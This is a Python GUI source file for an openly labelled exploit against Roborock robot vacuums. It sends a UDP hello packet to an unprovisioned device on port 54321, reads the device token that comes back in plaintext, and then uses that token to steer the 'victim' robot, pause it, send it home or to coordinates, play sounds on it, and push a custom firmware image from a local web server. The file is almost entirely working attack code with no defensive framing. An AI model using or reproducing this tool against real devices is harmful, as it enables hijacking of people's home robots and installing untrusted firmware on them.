import sys
from PySide6 import QtCore, QtWidgets, QtGui
import socket
from miio import RoborockVacuum
from datetime import datetime
import http.server
import socketserver
import threading
import time

class Exploit(QtWidgets.QWidget):

    def __init__(self):
        super().__init__()
        self.discover_button = QtWidgets.QPushButton("Discover Vulnerable Robot")
        self.home_button = QtWidgets.QPushButton("Return Victim to Home")
        self.find_button = QtWidgets.QPushButton("Play sound Que on Victim")
        self.upload_firmware = QtWidgets.QPushButton("Upload Custom Firmware Image to Victim")
        self.upload_music = QtWidgets.QPushButton("Upload custom sound to Victim")
        self.goto_location = QtWidgets.QPushButton("Go to location")
        self.pause_button = QtWidgets.QPushButton("Pause Victim")
        self.steer_button = QtWidgets.QPushButton("Steer Victim")

        self.device_info = QtWidgets.QLabel("No devices hooked", alignment=QtCore.Qt.AlignCenter)

        self.layout = QtWidgets.QVBoxLayout(self)
        self.layout.addWidget(self.discover_button)
        self.layout.addWidget(self.home_button)
        self.layout.addWidget(self.find_button)
        self.layout.addWidget(self.upload_firmware)
        self.layout.addWidget(self.upload_music)
        self.layout.addWidget(self.goto_location)
        self.layout.addWidget(self.steer_button)
        self.layout.addWidget(self.pause_button)
    
        
        self.layout.addWidget(self.device_info)
       

        self.discover_button.clicked.connect(self.get_device)
        self.home_button.clicked.connect(self.go_home)
        self.find_button.clicked.connect(self.find_vac)
        self.goto_location.clicked.connect(self.go_to_location)
        self.pause_button.clicked.connect(self.pause_robot)
        self.steer_button.clicked.connect(self.steer_robot)
        self.upload_firmware.clicked.connect(self.upload_sw)

        #set up logging
        self.logWindow = ExploitLog()
        self.logWindow.show()

    @QtCore.Slot()
    def get_device(self):
        token = self.get_token("192.168.8.1", 54321) #Standard ip and port of unprovisioned device
        self.device_info.setText("Getting device info")
        self.layout.addWidget(self.device_info)
        self.vac = RoborockVacuum("192.168.8.1", token.hex())
        self.device_info.setText(str(self.vac.info()))  

    @QtCore.Slot()
    def go_home(self):
        rsp = self.vac.home()
        self.logWindow.log(str(rsp))

    @QtCore.Slot()
    def find_vac(self):
        rsp = self.vac.find()
        self.logWindow.log(str(rsp))  
    
    @QtCore.Slot()
    def go_to_location(self):
        x, done = QtWidgets.QInputDialog.getInt(self, "Give Coordinates", "X:", 0)
        y, done = QtWidgets.QInputDialog.getInt(self, "Give Coordinates", "Y:", 0)
        rsp = self.vac.goto(x,y)
        self.logWindow.log(str(rsp))

    @QtCore.Slot()
    def pause_robot(self):
        rsp = self.vac.pause()
        self.logWindow.log(str(rsp))

    @QtCore.Slot()
    def steer_robot(self):
        angle, done = QtWidgets.QInputDialog.getInt(self, "Enter Angle", "Angle in [-180, 180]", 0)
        velocity, done =  QtWidgets.QInputDialog.getDouble(self, "Enter Velocity", "Velocity in [-0.3, 0.3]", 0)
        duration, done =  QtWidgets.QInputDialog.getInt(self, "Enter Duration", "Duration in [0, 5000] (ms)", 1000)
        rsp = self.vac.manual_control_once(angle, velocity, duration)
        self.logWindow.log(str(rsp))

    @QtCore.Slot()
    def upload_sw(self):
        PORT = 8000
        handler = http.server.SimpleHTTPRequestHandler
        httpd = socketserver.TCPServer(("", PORT), handler)

        def start_server():
            print("Server started at localhost: " + str(PORT))
            httpd.serve_forever()
    
        
        def status_download():
            time.sleep(3)
            resp = self.vac.update("http://192.168.8.191:8000/v11_002008.pkg","dfac5a0487320e9c222ed38c9ab1568c")
            self.logWindow.log(str(resp))
            for i in range(100):
                resp = self.vac.update_progress()
                self.logWindow.log(str(resp))
                time.sleep(3)
            httpd.shutdown()

        downloading_thread = threading.Thread(target=start_server)
        status_thread = threading.Thread(target=status_download)

        downloading_thread.start()
        status_thread.start()
        
    def get_token(self, HOST, PORT):
        hook_packet = "21310020ffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        #Open up a socket that communicates with the robot
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            #Send the hooking packet
            s.sendto(bytes.fromhex(hook_packet), (HOST, PORT))
            #Listen for the response
            data, addr = s.recvfrom(4096)
            #Key is in plaintext
            token = data[16:]
            print(token.hex())
        return token

class ExploitLog(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Log: Victim Responses")
        lay = QtWidgets.QVBoxLayout(self)
        self.logtext = QtWidgets.QLabel("")
        self.logtext.setAlignment(QtCore.Qt.AlignLeft | QtCore.Qt.AlignTop)
        self.logtext.setWordWrap(True)
        lay.addWidget(self.logtext)
    
    def log(self, text):
        self.logtext.setText(self.logtext.text() + "\n[" + datetime.now().strftime("%H:%M:%S") + "] " + text)
if __name__ == "__main__":
    app = QtWidgets.QApplication([])

    widget = Exploit()
    widget.resize(600, 200)
    widget.show()

    sys.exit(app.exec())


        
